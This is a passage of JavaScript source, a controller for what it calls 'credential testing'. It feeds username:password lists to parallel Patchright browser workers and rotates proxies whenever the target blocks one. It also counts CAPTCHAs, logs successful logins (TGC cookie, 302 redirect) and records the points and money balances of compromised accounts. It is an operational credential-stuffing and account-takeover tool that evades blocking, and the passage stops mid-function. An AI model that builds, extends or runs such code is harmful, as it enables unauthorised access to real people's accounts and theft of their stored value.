/**
 * ============================================================================
 * PATCHRIGHT CONTROLLER PROCESS - Multi-Worker Credential Testing
 * ============================================================================
 * 
 * Main entry point that: 
 * ✅ Reads credentials from test.txt
 * ✅ Reads proxies from Lightning_Proxies.txt
 * ✅ Distributes credentials to worker processes
 * ✅ Monitors worker execution with advanced logging
 * ✅ Collects and reports metrics with beautiful output
 * ✅ TGC-priority reporting
 * ✅ Confidence-based filtering (>= 0.85)
 * ✅ Interactive CLI with startup wizard
 * ✅ Real-time progress dashboard
 * ✅ Resource monitoring and optimization
 * ✅ Health checks and auto-recovery
 * 
 * Usage: node play_version2_controller.js
 */

const { fork } = require('child_process');
const fs = require('fs');
const path = require('path');

const config = require('./config');
const AdvancedLogger = require('./utils/logger');
const RetryQueue = require('./utils/retryQueue');
const CredentialHistory = require('./utils/credentialHistory');
const InteractiveCLI = require('./utils/interactiveCLI');
const ProgressDashboard = require('./utils/progressDashboard');
const ResourceManager = require('./utils/resourceManager');
const HealthCheckSystem = require('./utils/healthCheck');
const ConfigValidator = require('./utils/configValidator');
const { applyUserConfig } = require('./utils/configApplier');

// ============ LOGGER INITIALIZATION ============
const logger = new AdvancedLogger({
  logDir: path.join(process.cwd(), 'logs'),
  level: config.logging.logLevel
});

// ============ RETRY QUEUE INITIALIZATION ============
let retryQueue = null;
if (config.retry && config.retry.enabled) {
  retryQueue = new RetryQueue({
    maxRetries: config.retry.maxRetries,
    queueFile: config.retry.queueFile
  });
}

// ⚡ PERFORMANCE: Ensure logger cleanup on process exit
process.on('exit', () => {
  logger.cleanupSync(); // Must use sync for exit event
});

process.on('SIGINT', () => {
  if (retryQueue) { try { retryQueue.save(); } catch (_) {} }
  logger.cleanupSync();
  process.exit(0);
});

process.on('SIGTERM', () => {
  if (retryQueue) { try { retryQueue.save(); } catch (_) {} }
  logger.cleanupSync();
  process.exit(0);
});

// ============ CREDENTIAL HISTORY INITIALIZATION ============
let credentialHistory = null;
if (config.history && config.history.enabled) {
  credentialHistory = new CredentialHistory(config.history);
  credentialHistory.load();
}

logger.info('[CONTROLLER]', '════════════════════════════════════════════════════════════════');
logger.info('[CONTROLLER]', 'PATCHRIGHT CREDENTIAL TESTING CONTROLLER');
logger.info('[CONTROLLER]', '════════════════════════════════════════════════════════════════');

// ============ GLOBAL BLOCK TRACKING ============
let globalBlockCount = 0;
const blockedProxies = new Map(); // Track proxies that have been blocked

// ============ UTILITIES ============
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;

// ============ FILE READING ============

/**
 * Parse credential line (username:  password format)
 */
function parseCredentialLine(line) {
  const trimmed = line.trim();
  
  if (!trimmed || trimmed.startsWith('#')) {
    return null;
  }

  const colonIndex = trimmed.indexOf(':');
  if (colonIndex === -1) {
    logger.warn('[PARSE]', `Invalid credential format (no colon): ${trimmed}`);
    return null;
  }

  const username = trimmed.substring(0, colonIndex).trim();
  const password = trimmed.substring(colonIndex + 1).trim();

  if (!username || !password) {
    logger.warn('[PARSE]', `Invalid credential (missing username or password): ${trimmed}`);
    return null;
  }

  return { username, password };
}

/**
 * ⚡ PERFORMANCE: Read and parse credentials asynchronously
 */
async function readCredentials(filepath) {
  try {
    if (!fs.existsSync(filepath)) {
      logger.error('[FILE]', `Credentials file not found: ${filepath}`);
      return [];
    }

    const content = await fs.promises.readFile(filepath, 'utf8');
    const lines = content.split('\n');
    const credentials = [];

    for (let i = 0; i < lines.length; i++) {
      const cred = parseCredentialLine(lines[i]);
      if (cred) {
        credentials.push({
          index: credentials.length,
          ...cred
        });
      }
    }

    logger.success('[FILE]', `Read ${credentials.length} valid credentials from ${filepath}`);
    return credentials;
  } catch (error) {
    logger.error('[FILE]', `Error reading credentials: ${error && error.message}`);
    return [];
  }
}

/**
 * ⚡ PERFORMANCE: Read and parse proxies asynchronously
 */
async function readProxies(filepath) {
  try {
    if (!fs.existsSync(filepath)) {
      logger.error('[FILE]', `Proxies file not found: ${filepath}`);
      return [];
    }

    const content = await fs.promises.readFile(filepath, 'utf8');
    const lines = content.split('\n');
    const proxies = [];

    for (const line of lines) {
      const trimmed = line.trim();
      
      if (!trimmed || trimmed.startsWith('#')) {
        continue;
      }

      proxies.push(trimmed);
    }

    logger.success('[FILE]', `Read ${proxies.length} proxies from ${filepath}`);
    return proxies;
  } catch (error) {
    logger.error('[FILE]', `Error reading proxies: ${error && error.message}`);
    return [];
  }
}

// ============ WORKER MANAGEMENT ============

/**
 * Launch a worker process with a batch of credentials
 */
function launchWorkerForSlice(slice, upstream, batchNum, rawProxies) {
  return new Promise((resolve) => {
    logger.info('[BATCH]', `[Batch #${batchNum}] Launching worker for ${slice.length} credentials`);
    logger.debug('[BATCH]', `[Batch #${batchNum}] Proxy:   ${upstream.substring(0, 50)}...`);

    // Only pass small scalar values via env to avoid E2BIG (argument list too long).
    // Large payloads (SLICE, PROXIES) are sent via IPC after the child starts.
    const env = Object.assign({}, process.env, {
      BATCH_NUM: String(batchNum)
    });

    const workerScript = path.join(__dirname, 'play_version2_worker_integrated_Version5.js');
    const child = fork(workerScript, ['--worker'], {
      env,
      stdio: ['inherit', 'inherit', 'inherit', 'ipc']
    });

    let finished = false;
    // Set to true when the worker has requested a respawn so the exit handler
    // does not prematurely resolve the batch promise while the new worker is
    // still starting up.
    let respawning = false;

    // Send large payloads via IPC instead of env vars; handle send errors gracefully
    const initPayload = { type: 'init', upstream, slice, proxies: rawProxies, batchNum };
    try {
      child.send(initPayload, (err) => {
        if (err && !finished) {
          finished = true;
          logger.error('[BATCH]', `[Batch #${batchNum}] Failed to send init payload to worker: ${err.message || err}`);
          try { child.kill('SIGTERM'); } catch (_) {}
          resolve({
            childPid: child.pid,
            code: -1,
            signal: null,
            workerMsg: null,
            slice,
            upstream,
            batchNum,
            error: `IPC init send failed: ${err.message || err}`
          });
        }
      });
    } catch (err) {
      if (!finished) {
        finished = true;
        logger.error('[BATCH]', `[Batch #${batchNum}] Exception while sending init payload to worker: ${err.message || err}`);
        try { child.kill('SIGTERM'); } catch (_) {}
        resolve({
          childPid: child.pid,
          code: -1,
          signal: null,
          workerMsg: null,
          slice,
          upstream,
          batchNum,
          error: `IPC init exception: ${err.message || err}`
        });
      }
    }

    let workerMsg = null;

    // Timeout handling
    const timeout = setTimeout(async () => {
      if (!finished) {
        logger.error('[BATCH]', `[Batch #${batchNum}] Worker timeout (${config.browser.timeout / 1000}s), terminating...  `);
        try { child.kill('SIGTERM'); } catch (_) {}

        setTimeout(() => {
          if (!finished) {
            logger.error('[BATCH]', `[Batch #${batchNum}] Force killing worker... `);
            try { child.kill('SIGKILL'); } catch (_) {}
          }
        }, config.browser.gracefulKillWait);
      }
    }, config.browser.timeout);

    // Message handling
    child.on('message', (msg) => {
      // Handle retry queue messages without finishing worker
      if (msg.type === 'retry_add' && retryQueue) {
        const retryUsername = msg.credential && msg.credential.username;
        const retryPassword = msg.credential && msg.credential.password;
        // Don't add if this exact credential combo already succeeded
        if (credentialHistory && credentialHistory.hasSucceeded && credentialHistory.hasSucceeded(retryUsername, retryPassword)) {
          logger.debug('[RETRY]', `Skipping retry for already-successful: ${retryUsername}`);
          return;
        }
        logger.debug('[RETRY]', `Adding to retry queue: ${retryUsername}`);
        retryQueue.add(msg.credential, msg.reason);
        return; // Don't mark as finished
      }
      
      // Handle block detection messages
      if (msg.type === 'block_detected') {
        logger.warn('[CONTROLLER]', `Block reported by worker: ${msg.blockType} - ${msg.reason}`);
        globalBlockCount++;
        // Track which proxies are problematic
        blockedProxies.set(msg.proxy, { timestamp: msg.timestamp, reason: msg.reason });
        return; // Don't mark as finished
      }

      // Handle respawn requests — worker signals it needs a fresh proxy immediately.
      // Kill the current worker and relaunch it with a new proxy for the remaining
      // credentials so the controller responds instantly instead of waiting for timeout.
      if (msg.type === 'respawn_with_new_proxy') {
        if (finished) return;
        logger.warn('[CONTROLLER]', `[Batch #${batchNum}] Worker requested proxy respawn (reason: ${msg.reason || 'proxy_blocked'})`);
        finished = true;
        respawning = true;
        clearTimeout(timeout);
        try { child.kill('SIGTERM'); } catch (_) {}

        // Use the remaining unprocessed credentials supplied by the worker, or fall
        // back to the full original slice if the worker did not provide a subset.
        const remainingSlice = (Array.isArray(msg.remainingSlice) && msg.remainingSlice.length > 0)
          ? msg.remainingSlice
          : slice;

        // Pick a proxy that differs from the current (blocked) upstream.
        const alternates = rawProxies.filter(p => p !== upstream);

        // When no alternate proxy is available, sending to the same blocked proxy
        // would cause another immediate respawn — a tight CPU-burning loop.
        // Instead, queue the remaining credentials for the next pass and resolve.
        if (alternates.length === 0) {
          logger.warn('[CONTROLLER]', `[Batch #${batchNum}] No alternative proxies available for respawn — queuing ${remainingSlice.length} credential(s) for retry`);
          if (retryQueue) {
            for (const cred of remainingSlice) {
              if (!credentialHistory || !credentialHistory.hasSucceeded(cred.username, cred.password)) {
                retryQueue.add({ username: cred.username, password: cred.password }, 'no_alternate_proxy');
              }
            }
          }
          resolve({
            childPid: child.pid,
            code: 0,
            signal: null,
            workerMsg: { status: 'blocked', reason: 'no_alternate_proxy' },
            slice,
            upstream,
            batchNum
          });
          return;
        }

        const newUpstream = alternates[rnd(0, alternates.length - 1)];
        logger.info('[CONTROLLER]', `[Batch #${batchNum}] Respawning worker with new proxy for ${remainingSlice.length} credential(s)`);
        launchWorkerForSlice(remainingSlice, newUpstream, batchNum, rawProxies).then(resolve);
        return;
      }

      // Handle credential result messages for history.
      // credential_result messages are intermediate IPC notifications sent as each
      // credential is processed; they are NOT the worker's final completion message,
      // so we return early here to avoid marking the batch as finished prematurely.
      if (msg.type === 'credential_result') {
        const { username, password, status, method, confidence, reason, pointsBalance, moneyBalance } = msg;
        // Normalise status: worker may send 'ok' as alias for 'success'
        const normStatus = status === 'ok' ? 'success' : status;

        // Mark individual successes in retry queue regardless of whether history is
        // enabled, so credentials don't get retried after a confirmed success.
        if (retryQueue && normStatus === 'success') {
          retryQueue.markSuccess({ username });
        }

        if (!credentialHistory) {
          logger.warn('[HISTORY]', `credential_result received for ${username} but history is not enabled`);
          return; // Don't mark as finished
        }
        
        if (normStatus === 'success') {
          credentialHistory.recordSuccess(username, password, method, confidence, pointsBalance, moneyBalance);
        } else if (normStatus === 'failed') {
          credentialHistory.recordFailed(username, password, reason);
        } else if (normStatus === 'error') {
          // Treat worker-reported errors as failed with the error reason
          credentialHistory.recordFailed(username, password, reason || 'worker_error');
        } else if (normStatus === 'blocked') {
          credentialHistory.recordBlocked(username, password, reason);
        } else if (normStatus === 'captcha') {
          credentialHistory.recordCaptcha(username, password);
        } else {
          // Unknown status – record as failed so no entry is silently lost
          logger.warn('[HISTORY]', `Unknown credential_result status '${status}' for ${username} – recording as failed`);
          credentialHistory.recordFailed(username, password, `unknown_status:${status}`);
        }
        
        return; // Don't mark as finished
      }

      finished = true;
      workerMsg = msg;
      clearTimeout(timeout);
      logger.debug('[BATCH]', `[Batch #${batchNum}] Worker response: ${msg && msg.status}`);
    });

    // Exit handling
    child.on('exit', (code, signal) => {
      // If we triggered a controller-managed respawn, the new worker's promise will
      // resolve this batch — ignore the old worker's exit so we don't double-resolve.
      if (respawning) return;
      finished = true;
      clearTimeout(timeout);
      resolve({
        childPid: child.pid,
        code,
        signal,
        workerMsg,
        slice,
        upstream,
        batchNum
      });
    });

    // Error handling
    child.on('error', (err) => {
      if (respawning) return;
      finished = true;
      clearTimeout(timeout);
      logger.error('[BATCH]', `[Batch #${batchNum}] Worker error:   ${err && err.message}`);
      resolve({
        childPid: child.pid,
        code: -1,
        signal: null,
        workerMsg: null,
        slice,
        upstream,
        batchNum,
        error: err && err.message
      });
    });
  });
}

// ============ MAIN CONTROLLER LOOP ============

(async () => {
  let cli = null;
  let dashboard = null;
  let resourceManager = null;
  let healthCheck = null;
  let monitoringInterval = null;

  // Detect CI and interactive mode
  const isCI = process.env.CI === 'true' || process.env.GITHUB_ACTIONS === 'true';
  const noInteractive = process.argv.includes('--no-interactive') || process.argv.includes('--ci');
  const skipInteractive = isCI || noInteractive || !(config.ux && config.ux.interactiveMode);

  try {
    // ⭐ ============ INTERACTIVE CLI WIZARD ============
    // Skip interactive mode if --no-interactive flag is present or CI environment
    if (!skipInteractive) {
      cli = new InteractiveCLI();
      const userConfig = await cli.runStartupWizard();
      
      if (!userConfig) {
        // User chose to exit
        process.exit(0);
      }
      
      // Apply user configuration
      applyUserConfig(config, userConfig);
      
      console.log(''); // Spacing after wizard
    } else if (noInteractive) {
      logger.info('[STARTUP]', 'Running in non-interactive mode (--no-interactive or CI environment)');
    }

    logger.info('[CONTROLLER]', '════════════════════════════════════════════════════════════════');
    logger.info('[CONTROLLER]', 'PATCHRIGHT CREDENTIAL TESTING CONTROLLER');
    logger.info('[CONTROLLER]', '════════════════════════════════════════════════════════════════');

    // ⭐ ============ CONFIGURATION VALIDATION ============
    const validator = new ConfigValidator();
    validator.validate(config);
    
    // Validate file access
    const credentialsFile = path.join(process.cwd(), 'test.txt');
    const proxiesFile = path.join(process.cwd(), 'Lightning_Proxies.txt');
    await validator.validateFiles(credentialsFile, proxiesFile);
    
    if (!validator.printReport()) {
      logger.error('[STARTUP]', 'Configuration validation failed. Please fix errors and try again.');
      if (cli) cli.close();
      process.exit(1);
    }

    // ⭐ ============ RESOURCE MANAGER INITIALIZATION ============
    resourceManager = new ResourceManager();
    const optimalWorkers = resourceManager.getOptimalWorkerCount();
    
    logger.info('[RESOURCE]', `💡 System Analysis:`);
    logger.info('[RESOURCE]', `   CPU Cores: ${optimalWorkers.cpuCount} (${optimalWorkers.availableCores} available)`);
    logger.info('[RESOURCE]', `   Total Memory: ${optimalWorkers.totalMemoryGB}GB`);
    logger.info('[RESOURCE]', `   Free Memory: ${optimalWorkers.freeMemoryGB}GB`);
    logger.info('[RESOURCE]', `   Recommended Workers: ${optimalWorkers.recommended}`);
    logger.info('[RESOURCE]', `   Reason: ${optimalWorkers.reason}`);
    
    // Ask to override worker count if different
    if (config.batch.maxParallelWorkers !== optimalWorkers.recommended) {
      logger.warn('[RESOURCE]', `Current config uses ${config.batch.maxParallelWorkers} workers`);
      
      if (cli && config.ux && config.ux.interactiveMode) {
        const override = await cli.confirm(
          `Override to recommended ${optimalWorkers.recommended} workers?`,
          true
        );
        
        if (override) {
          config.batch.maxParallelWorkers = optimalWorkers.recommended;
          logger.success('[RESOURCE]', `Worker count updated to ${optimalWorkers.recommended}`);
        }
      }
    }

    // Close CLI if we're done with it
    if (cli) {
      cli.close();
      cli = null;
    }

    // ⚡ PERFORMANCE: Read credentials and proxies in parallel
    const [credentials, rawProxies] = await Promise.all([
      readCredentials(credentialsFile),
      readProxies(proxiesFile)
    ]);

    if (credentials.length === 0) {
      logger.error('[STARTUP]', 'No valid credentials found in test.txt');
      process.exit(1);
    }

    // Filter credentials using history
    let credentialsToTest = credentials;
    if (credentialHistory) {
      credentialsToTest = credentialHistory.filterCredentials(credentials);
      if (credentialsToTest.length === 0) {
        logger.success('[HISTORY]', 'All credentials already tested!');
        process.exit(0);
      }
    }

    if (rawProxies.length === 0) {
      logger.error('[STARTUP]', 'No proxies found in Lightning_Proxies.txt');
      process.exit(1);
    }

    // Load retry queue if enabled
    if (retryQueue) {
      logger.info('[RETRY]', 'Loading existing retry queue...');
      retryQueue.load();
      const queueStats = retryQueue.getStats();
      logger.info('[RETRY]', `Queue loaded: ${queueStats.currentQueueSize} entries, ${queueStats.retryableCredentials} retryable`);
    }

    // Re-add retry-eligible credentials that were filtered out by history
    if (retryQueue && credentialHistory) {
      const retryableNow = retryQueue.getRetryable();
      const testUsernames = new Set(credentialsToTest.map(c => c.username));
      // Build a lookup map from the full credentials list for O(1) access
      const credentialsByUsername = new Map(credentials.map(c => [c.username, c]));

      let reAdded = 0;
      for (const retryCred of retryableNow) {
        if (!testUsernames.has(retryCred.username)) {
          const fullCred = credentialsByUsername.get(retryCred.username);
          // Prefer the full credential from the current input; fall back to
          // the retry queue entry for credentials from previous runs
          credentialsToTest.push(fullCred || retryCred);
          testUsernames.add(retryCred.username);
          reAdded++;
        }
      }

      if (reAdded > 0) {
        logger.info('[RETRY]', `Re-added ${reAdded} retry-eligible credentials that were filtered by history`);
      }
    }

    logger.info('[STARTUP]', '');
    logger.info('[STARTUP]', `Configuration:`);
    logger.info('[STARTUP]', `  Total Credentials: ${credentials.length}`);
    logger.info('[STARTUP]', `  Credentials to Test: ${credentialsToTest.length}`);
    logger.info('[STARTUP]', `  Total Proxies: ${rawProxies.length}`);
    logger.info('[STARTUP]', `  Credentials per Batch: ${config.batch.credentialsPerProxy}`);
    logger.info('[STARTUP]', `  Max Parallel Workers: ${config.batch.maxParallelWorkers}`);
    logger.info('[STARTUP]', `  Retry Queue: ${retryQueue ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Credential History: ${credentialHistory ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Session Reuse: ${config.session && config.session.enabled ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Connection Pool: ${config.performance && config.performance.enableConnectionPool ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Health Checks: ${config.stability && config.stability.enableHealthChecks ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Auto-recovery: ${config.stability && config.stability.enableAutoRecovery ? 'Enabled' : 'Disabled'}`);
    logger.info('[STARTUP]', `  Log Directory: ${logger.logDir}`);
    logger.info('[STARTUP]', '');

    // ⭐ ============ PROGRESS DASHBOARD INITIALIZATION ============
    // Skip dashboard in CI or if explicitly disabled
    const showDashboard = config.ux && config.ux.showDashboard && !isCI && !noInteractive;
    
    if (showDashboard) {
      dashboard = new ProgressDashboard();
      dashboard.updateStats({
        total: credentialsToTest.length,
        processed: 0,
        successful: 0,
        failed: 0,
        blocked: 0,
        captcha: 0,
        inProgress: 0,
        startTime: Date.now()
      });
      
      logger.info('[DASHBOARD]', 'Real-time dashboard enabled');
    }

    // ⭐ ============ HEALTH CHECK INITIALIZATION ============
    if (config.stability && config.stability.enableHealthChecks) {
      healthCheck = new HealthCheckSystem();
      
      const workerStats = { starts: 0, crashes: 0 };
      
      const checks = HealthCheckSystem.createDefaultChecks({
        proxyFailureRate: 0,
        workerStarts: workerStats.starts,
        workerCrashes: workerStats.crashes,
        retryQueue
      });
      
      for (const [name, checkFn] of Object.entries(checks)) {
        healthCheck.register(name, checkFn, config.stability.healthCheckInterval || 30000);
      }
      
      logger.info('[HEALTH]', 'Health monitoring enabled');
    } else {
      logger.info('[HEALTH]', 'Health monitoring disabled via config');
    }

    // ⭐ ============ RESOURCE MONITORING ============
    if (config.performance && config.performance.autoTuneWorkers && resourceManager) {
      monitoringInterval = setInterval(async () => {
        const resources = await resourceManager.monitorResources();
        
        if (resources.shouldThrottle) {
          logger.warn('[RESOURCE]', `⚠️  System resources strained (CPU: ${resources.current.cpu}%, Memory: ${resources.current.memory}%)`);
        }
        
        const recommendations = resourceManager.getRecommendations();
        if (recommendations.length > 0) {
          recommendations.forEach(rec => {
            if (rec.type === 'critical') {
              logger.error('[RESOURCE]', `🚨 ${rec.message}`);
            } else if (rec.type === 'warning') {
              logger.warn('[RESOURCE]', `⚠️  ${rec.message}`);
            }
          });
        }
        
        // Run health checks
        if (healthCheck) {
          const health = await healthCheck.runAll();
          const overall = healthCheck.getOverallHealth();
          
          if (!overall.healthy) {
            const failingSummary = overall.failingChecks.join(', ');
            logger.warn('[HEALTH]', `🏥 Health check score: ${overall.score}% (${overall.failingChecks.length} of ${overall.totalChecks} checks failing: ${failingSummary})`);
          }
        }
      }, config.performance.monitorInterval || 10000);
    }

    // Distribute credentials into batches
    const batches = [];
    for (let i = 0; i < credentialsToTest.length; i += config.batch.credentialsPerProxy) {
      batches.push(credentialsToTest.slice(i, i + config.batch.credentialsPerProxy));
    }

    logger.info('[STARTUP]', `Created ${batches.length} batches`);
    logger.info('[STARTUP]', '');
    logger.info('[STARTUP]', 'Starting batch processing...');
    logger.info('[STARTUP]', '');

    // Track results
    const startTime = Date.now();
    let batchNum = 0;
    let pointer = 0;
    let totalProcessed = 0;
    let totalSuccessful = 0;
    let totalTGC = 0;
    let totalRedirect302 = 0;
    let totalBlocked = 0;
    let totalCaptchas = 0;
    const activeWorkers = new Set();
    const batchResults = [];
    let lastAutoSavedBatch = 0; // Track last batch number at which we auto-saved

    // Main loop
    while (pointer < batches.length || activeWorkers.size > 0) {
      // Launch workers until max parallel reached
      while (activeWorkers.size < config.batch.maxParallelWorkers && pointer < batches.length) {
        batchNum++;
        const batch = batches[pointer];
        pointer++;

        const upstream = rawProxies[rnd(0, rawProxies.length - 1)];

        const workerPromise = launchWorkerForSlice(batch, upstream, batchNum, rawProxies)
          .then(result => {
            activeWorkers.delete(workerPromise);
            return result;
          });

        activeWorkers.add(workerPromise);

        logger.debug('[BATCH]', `[Batch #${batchNum}] Worker queued (${activeWorkers.size}/${config.batch.maxParallelWorkers} active)`);

        // Stagger worker launches
        await sleep(rnd(config.batch.pauseBetweenBatchMin, config.batch.pauseBetweenBatchMax));
      }

      // Wait for first worker to complete
      if (activeWorkers.size === 0) break;

      // ⚡ PERFORMANCE: Yield to event loop to prevent CPU spinning
      await new Promise(resolve => setImmediate(resolve));

      const result = await Promise.race(activeWorkers);
      const { workerMsg, slice, batchNum: bn, code, signal, error } = result;

      batchResults.push(result);

      logger.info('[BATCH]', `[Batch #${bn}] Completed`);

      // ⚡ PERFORMANCE: Keep only recent batch results to avoid unbounded memory growth
      // Maintains a sliding window of the most recent batches for debugging
      if (batchResults.length > 50) {
        batchResults.shift(); // Remove oldest batch, keep most recent 50
      }

      if (!workerMsg && (code !== 0 || signal)) {
        logger.warn('[BATCH]', `[Batch #${bn}] Worker crashed (code=${code}, signal=${signal})`);

        // RECOVER: Add credentials that didn't succeed to the retry queue.
        // Skip already-successful ones so they are not re-tested.
        if (retryQueue) {
          let retryAdded = 0;
          for (const cred of slice) {
            if (!credentialHistory || !credentialHistory.hasSucceeded(cred.username, cred.password)) {
              retryQueue.add(
                { username: cred.username, password: cred.password },
                'worker_crash'
              );
              retryAdded++;
            }
          }
          logger.info('[RETRY]', `Recovered ${retryAdded} credentials from crashed worker into retry queue`);
        }

        // Record each credential in history so it is not silently lost.
        // Skip credentials that were already recorded as successful via credential_result
        // IPC messages — overwriting a success with worker_crash would cause re-testing.
        if (credentialHistory) {
          for (const cred of slice) {
            if (!credentialHistory.hasSucceeded(cred.username, cred.password)) {
              credentialHistory.recordFailed(cred.username, cred.password, 'worker_crash');
            }
          }
        }

        for (const cred of slice) {
          totalProcessed++;
        }
      } else if (!workerMsg) {
        logger.warn('[BATCH]', `[Batch #${bn}] No response from worker`);

        // RECOVER: Add credentials that didn't succeed to the retry queue.
        // Skip already-successful ones so they are not re-tested.
        if (retryQueue) {
          let retryAdded = 0;
          for (const cred of slice) {
            if (!credentialHistory || !credentialHistory.hasSucceeded(cred.username, cred.password)) {
              retryQueue.add(
                { username: cred.username, password: cred.password },
                'worker_no_response'
              );
              retryAdded++;
            }
          }
          logger.info('[RETRY]', `Recovered ${retryAdded} credentials from unresponsive worker into retry queue`);
        }

        // Record each credential in history so it is not silently lost.
        // Skip credentials that were already recorded as successful via credential_result
        // IPC messages — overwriting a success with worker_no_response would cause re-testing.
        if (credentialHistory) {
          for (const cred of slice) {
            if (!credentialHistory.hasSucceeded(cred.username, cred.password)) {
              credentialHistory.recordFailed(cred.username, cred.password, 'worker_no_response');
            }
          }
        }

        for (const cred of slice) {
          totalProcessed++;
        }
      } else {
        if (workerMsg.status === 'ok') {
          const stats = workerMsg.stats;
          totalProcessed += workerMsg.processed || slice.length;

          // Extract stats from worker
          if (workerMsg.stats) {
            totalSuccessful += stats.successful || 0;
            totalTGC += stats.tgcSuccess || 0;
            totalRedirect302 += stats.redirect302Success || 0;
            totalCaptchas += stats.captchas || 0;

            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            const rate = (totalProcessed / (elapsed / 60)).toFixed(2);

            // Update dashboard if enabled
            if (dashboard) {
              dashboard.updateStats({
                total: credentials.length,
                processed: totalProcessed,
                successful: totalSuccessful,
                failed: totalProcessed - totalSuccessful - totalBlocked - totalCaptchas,
                blocked: totalBlocked,
                captcha: totalCaptchas,
                startTime
              });
            } else {
              // Display progress bar (legacy mode)
              logger.progressBar(totalProcessed, credentials.length, `[Progress]`);
            }

            if (!dashboard) {
              logger.info('[RESULTS]', `[Batch #${bn}] Status: OK`);
              logger.info('[RESULTS]', `           Processed: ${workerMsg.processed || slice.length}`);
              logger.info('[RESULTS]', `           Success (>= 85%):  ${stats.successful || 0}/${stats.totalAttempts || 0}`);
              if (stats.tgcSuccess) {
                logger.success('[RESULTS]', `           ✅ TGC Cookie: ${stats.tgcSuccess}`);
              }
              if (stats.redirect302Success) {
                logger.success('[RESULTS]', `           ✅ Redirect 302: ${stats.redirect302Success}`);
              }
              if (stats.captchas) {
                logger.warn('[RESULTS]', `           ⚠️  CAPTCHAs: ${stats.captchas}`);
              }
              logger.info('[RESULTS]', `           Total:   ${totalProcessed}/${credentials.length}`);
              logger.info('[RESULTS]', `           Rate: ${rate} creds/min`);
            }
          }
        } else if (workerMsg.status === 'blocked') {
          totalBlocked++;
          totalProcessed += workerMsg.processed || 0;

          logger.clearProgressBar();
          logger.error('[RESULTS]', `[Batch #${bn}] Status: BLOCKED`);
          logger.error('[RESULTS]', `           Reason: ${workerMsg.reason}`);
          logger.error('[RESULTS]', `           Processed before block: ${workerMsg.processed || 0}`);

          if (workerMsg.failedCred) {
            logger.error('[RESULTS]', `           Failed at:   ${workerMsg.failedCred.username}`);
          }
        } else if (workerMsg.status === 'failed') {
          logger.clearProgressBar();
          logger.error('[RESULTS]', `[Batch #${bn}] Status:   FAILED`);
          logger.error('[RESULTS]', `           Reason: ${workerMsg.  reason}`);
          totalProcessed += workerMsg.processed || 0;
        } else {
          logger.clearProgressBar();
          logger.warn('[RESULTS]', `[Batch #${bn}] Unknown status: ${workerMsg.status}`);
          totalProcessed += workerMsg.processed || 0;
        }
      }

      logger.info('[BATCH]', '');

      // Periodic auto-save of retry queue (every 10 completed batches)
      if (retryQueue && bn >= lastAutoSavedBatch + 10) {
        retryQueue.save();
        lastAutoSavedBatch = bn;
        logger.debug('[RETRY]', `Auto-saved retry queue (${retryQueue.size()} entries)`);
      }
    }

    // ⭐ ============ RETRY QUEUE PROCESSING ============

    if (retryQueue && config.retry.enabled) {
      logger.info('[RETRY]', '');
      logger.info('[RETRY]', '════════════════════════════════════════════════════════════════');
      logger.info('[RETRY]', 'RETRY QUEUE PROCESSING');
      logger.info('[RETRY]', '════════════════════════════════════════════════════════════════');

      let retryPass = 0;
      const MAX_RETRY_PASSES = config.retry.maxRetryPasses || 3;
      // Monotonically increasing batch counter across all retry passes
      let retryBatchNum = batchNum;

      while (retryPass < MAX_RETRY_PASSES) {
        retryPass++;
        retryQueue.cleanExhausted();
        const retryable = retryQueue.getRetryablePrioritized();

        if (retryable.length === 0) {
          logger.info('[RETRY]', `Retry pass ${retryPass}/${MAX_RETRY_PASSES}: No credentials eligible for retry`);
          break;
        }

        logger.info('[RETRY]', `Retry pass ${retryPass}/${MAX_RETRY_PASSES}: ${retryable.length} credentials`);

        // Account for this batch of retries being dispatched
        retryQueue.markRetried(retryable.length);

        // Create retry batches
        const retryBatches = [];
        for (let i = 0; i < retryable.length; i += config.batch.credentialsPerProxy) {
          retryBatches.push(retryable.slice(i, i + config.batch.credentialsPerProxy));
        }

        logger.info('[RETRY]', `Created ${retryBatches.length} retry batches`);
        logger.info('[RETRY]', '');

        // Process retry batches
        let retryPointer = 0;
        const retryActiveWorkers = new Set();

        while (retryPointer < retryBatches.length || retryActiveWorkers.size > 0) {
          // Launch retry workers
          while (retryActiveWorkers.size < config.batch.maxParallelWorkers && retryPointer < retryBatches.length) {
            retryBatchNum++;
            const retryBatch = retryBatches[retryPointer];
            retryPointer++;

            // Select random proxy (defensive check)
            if (rawProxies.length === 0) {
              logger.error('[RETRY]', 'No proxies available for retry batches');
              break;
            }
            const upstream = rawProxies[rnd(0, rawProxies.length - 1)];

            const workerPromise = launchWorkerForSlice(retryBatch, upstream, retryBatchNum, rawProxies)
              .then(result => {
                retryActiveWorkers.delete(workerPromise);
                return result;
              });

            retryActiveWorkers.add(workerPromise);

            // Add delay between retry attempts
            if (config.retry.retryDelayMin && config.retry.retryDelayMax) {
              await sleep(rnd(config.retry.retryDelayMin, config.retry.retryDelayMax));
            } else {
              await sleep(rnd(config.batch.pauseBetweenBatchMin, config.batch.pauseBetweenBatchMax));
            }
          }

          if (retryActiveWorkers.size === 0) break;

          // ⚡ PERFORMANCE: Yield to event loop to prevent CPU spinning
          await new Promise(resolve => setImmediate(resolve));

          const result = await Promise.race(retryActiveWorkers);
          const { workerMsg, slice: retrySlice, batchNum: rbn } = result;

          logger.info('[RETRY]', `[Retry Batch #${rbn}] Completed`);

          // Process retry results
          if (workerMsg && workerMsg.status === 'ok' && workerMsg.stats) {
            const stats = workerMsg.stats;
            totalSuccessful += stats.successful || 0;
            totalTGC += stats.tgcSuccess || 0;
            totalRedirect302 += stats.redirect302Success || 0;

            // Individual successes are marked via credential_result IPC messages
            logger.success('[RETRY]', `[Retry Batch #${rbn}] ${stats.successful || 0} successful retries`);
          }
        }

        // Save retry queue after each pass
        retryQueue.save();
      }

      const finalStats = retryQueue.getStats();

      logger.info('[RETRY]', '');
      logger.info('[RETRY]', 'Retry Queue Statistics:');
      logger.info('[RETRY]', `  Total Added: ${finalStats.totalAdded}`);
      logger.info('[RETRY]', `  Total Retried: ${finalStats.totalRetried}`);
